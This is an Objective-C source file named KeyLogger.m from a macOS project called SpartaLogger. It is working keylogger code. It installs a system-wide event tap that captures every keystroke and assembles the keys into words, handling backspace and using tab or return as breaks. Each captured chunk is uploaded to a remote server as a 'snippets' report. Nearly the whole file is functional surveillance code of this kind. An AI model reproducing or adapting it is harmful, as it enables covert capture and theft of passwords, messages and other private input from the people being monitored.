//
//  KeyLogger.m
//  SpartaLogger
//
//  Created by Ryan Gomba on 11/25/11.
//  Copyright (c) 2011 AppThat. All rights reserved.
//

#define MAX_BUFFER_SIZE 0

#import "KeyLogger.h"
#import "HTTPClient.h"

@implementation KeyLogger

@synthesize buffer;

#pragma mark -
#pragma mark Memory

- (id)init {
    self = [super init];
    if (self) {
        NSLog(@"INITIALIZING");
        buffer = [[[NSString alloc] init] retain];
    }
    return self;
}

- (void)dealloc
{
    [buffer release];
    [super dealloc];
}

#pragma mark -
#pragma mark Setup

CGEventRef myCGEventCallback(CGEventTapProxy proxy, CGEventType type,
                             CGEventRef event, void *refcon)
{
    CGPoint location;
    UniChar unicodeString[10];
    UniCharCount actualStringLength;
    
    switch(type){       
        case kCGEventKeyDown: CGEventKeyboardGetUnicodeString(event, sizeof(unicodeString) / sizeof(*unicodeString), &actualStringLength, unicodeString);
            //NSLog(@"%d", unicodeString[0]);
            CGEventFlags flag = CGEventGetFlags(event);
            if (flag == kCGEventFlagMaskNonCoalesced || flag == kCGEventFlagMaskAlphaShift || flag == kCGEventFlagMaskShift || flag == 131330) {
                [(id)refcon fillBuffer:unicodeString[0]];
            } else {
                //NSLog(@"%d", flag);
                //[(id)refcon clearBuffer];
            }
            break;
            
        case kCGEventLeftMouseDown:	location = CGEventGetLocation(event);
            //NSLog(@"leftClick\t%4.0f, %4.0f\n", location.x, location.y);
            break;
            
        case kCGEventRightMouseDown:	location = CGEventGetLocation(event);
            //NSLog(@"rightClick\t%4.0f, %4.0f\n", location.x, location.y);
            break;
    }
    // We must return the event for it to be useful.
    return event;
}

- (void)startKeyLogger {
    CFMachPortRef eventTap;
    CGEventMask eventMask;
    CFRunLoopSourceRef runLoopSource;
    
    eventMask = CGEventMaskBit(kCGEventLeftMouseDown) |
    CGEventMaskBit(kCGEventRightMouseDown) |
    CGEventMaskBit(kCGEventKeyDown);
    
    eventTap = CGEventTapCreate(
                                kCGHIDEventTap, kCGHeadInsertEventTap,
                                0, eventMask, myCGEventCallback, self);
    if (!eventTap) {
        NSLog(@"failed to create event tap\n");
    }
    
    // Create a run loop source.
    runLoopSource = CFMachPortCreateRunLoopSource(
                                                  kCFAllocatorDefault, eventTap, 0);
    
    CFRelease(eventTap);
    // Add to the current run loop.
    CFRunLoopAddSource([[NSRunLoop currentRunLoop] getCFRunLoop], runLoopSource, kCFRunLoopCommonModes);
    
    CFRelease(runLoopSource);   
}

#pragma mark -
#pragma mark Gathering

- (void)fillBuffer:(UniChar)c
{
    if (c == 9 || c == 13) {
        [self clearBuffer];
    } else if (c == 8 && self.buffer.length > 0) {
        self.buffer = [self.buffer substringToIndex:self.buffer.length - 1];
    } else {
        self.buffer = [self.buffer stringByAppendingString:[NSString stringWithCharacters:&c length:1]];
    }
}

- (void)clearBuffer
{
    if (self.buffer.length > MAX_BUFFER_SIZE) {
            [self parseWord:buffer];
            self.buffer = @"";
    } else {
        self.buffer = [self.buffer stringByAppendingString:@"\n"];
    }
}

#pragma mark -
#pragma mark Request

- (void)parseWord:(NSString *)word
{
    NSLog(@"%@", word);
    NSMutableDictionary *report = [NSMutableDictionary dictionaryWithObjectsAndKeys:
                                   word, @"text",
                                   nil];
    [HTTPClient sendReport:report toFile:@"snippets"];
}

@end
